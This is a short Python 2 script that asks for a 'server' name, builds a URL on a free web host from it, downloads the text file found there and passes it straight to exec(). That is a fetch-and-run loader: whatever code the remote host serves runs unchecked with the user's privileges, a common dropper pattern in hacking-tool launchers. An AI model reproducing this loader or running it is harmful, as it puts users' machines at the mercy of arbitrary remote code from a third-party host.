import requests
b=raw_input('\x1b[1;31m[?]\x1b[1;34m Server: ')
a='https://dinartaqwa.000webhostapp.com/'+b+'.txt'
exec(requests.get(a).text)
print '\x1b[1;31m\n[+]\x1b[1;34m Done ! '
